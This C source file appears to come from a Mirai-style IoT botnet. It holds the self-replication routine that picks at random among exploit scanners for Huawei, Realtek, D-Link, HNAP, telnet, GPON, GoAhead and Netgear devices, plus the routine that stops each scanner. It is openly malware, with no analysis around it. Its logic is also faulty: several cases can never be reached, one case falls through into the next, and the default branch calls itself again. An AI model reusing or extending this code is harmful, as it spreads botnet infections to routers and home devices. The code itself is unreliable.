#ifdef SELFREP
#include <stdio.h>
#include <stdlib.h>

#include "h/dlink_scanner.h"
#include "h/gpon8080_scanner.h"
#include "h/gpon80_scanner.h"
#include "h/hnap.h"
#include "h/dlink_scanner.h"
#include "h/realtek_scanner.h"
#include "h/huawei_scanner.h"
#include "h/scanner.h"
#include "h/scanner_init.h"
#include "h/goahead_scanner.h"
#include "h/netgear_r7064.h"



struct exploit_kill *scan_kill;
void start_scanner(void) { 
  //multiple scanner initialize by forsaken
  int scanstatus = 0;
  int yeet = rand() % 7; 
  switch(yeet) {
    case 1:
#ifdef DEBUG
            printf("[scanner] initalizing huawei scanner.\n");
#endif
        huaweiscanner_scanner_init();
        scan_kill->state = KILL_HUAWEI;
       break;
    case 2:
#ifdef DEBUG
      printf("[scanner] initalizing realtek scanner.\n");
#endif
      realtek_scanner();
      scan_kill->state = KILL_REALTEK; 
    break;
    case 3:
#ifdef DEBUG
      printf("[scanner] initalizing hnap scanner\n");
#endif
      hnapscanner_scanner_init();
      scan_kill->state = KILL_HNAP;
    break;
    case 4:
#ifdef DEBUG
      printf("[scanner] initalizing dlink scanner\n");
#endif
      dlink_scanner();
      scan_kill->state = KILL_DLINK;
    break;
    case 5:
#ifdef DEBUG
      printf("[scanner] initalizing telnet scanner\n");
#endif
      scanner_init();
      scan_kill->state = KILL_TELNET;
    break;
    case 6:
#ifdef DEBUG
      printf("[scanner] initalizing gpon80 scanner\n");
#endif
      gpon80_scanner();
      scan_kill->state = KILL_GPON1;
    break;
    case 7:
#ifdef DEBUG
      printf("[scanner] initalizing gpon8080 scanner\n");
#endif
      gpon8080_scanner();
      scan_kill->state = KILL_GPON2;
    break;
case 8:
#ifdef DEBUG
      printf("[scanner] initalizing goahead scanner\n");   
#endif
      goahead_scanner_init();
      scan_kill->state = KILL_GOAHEAD;
      case 9:
#ifdef DEBUG
      printf("[scanner] initalizing netgear_r7064 scanner\n");   
#endif
      netgear_r7064_scanner();
      scan_kill->state = KILL_netgear_r7064;
    break;
    break;
    default:
        stop_scanner();
        start_scanner();
    break;
  }
}
void stop_scanner(void) {
    switch(scan_kill->state) {
      case KILL_HUAWEI:
#ifdef DEBUG
        printf("[scanner] killing huawei scanner.\n");
#endif
        huaweiscanner_scanner_kill();
      break;
      case KILL_REALTEK:
#ifdef DEBUG
        printf("[scanner] killing realtek scanner.\n");
#endif
        realtek_kill();
      break;
      case KILL_TELNET:
#ifdef DEBUG
        printf("[scanner] killing telnet scanner\n");
#endif
        scanner_kill();
      break;
      case KILL_GPON1:
#ifdef DEBUG
        printf("[scanner] killing gpon80 scanner\n");
#endif
        gpon80_kill();
      break;
      case KILL_GPON2:
#ifdef DEBUG
        printf("[scanner] killing gpon8080 scanner\n");
#endif
        gpon8080_kill();
      break;
      case KILL_DLINK:
#ifdef DEBUG
        printf("[scanner] killing dlink scanner\n");
#endif
        dlink_kill();
      break;
      case KILL_HNAP:
#ifdef DEBUG
        printf("[scanner] killing hnap scanner\n");
#endif
        hnapscanner_scanner_kill();
      break;
case KILL_GOAHEAD:
#ifdef DEBUG
        printf("[scanner] killing GOAHEAD scanner\n"); 
#endif
        goahead_scanner_kill();
      break;
      case KILL_netgear_r7064:
#ifdef DEBUG
        printf("[scanner] killing netgear_r7064 scanner\n"); 
#endif
        netgear_r7064_kill();
      break;
      default:break; 
    }
}
#endif



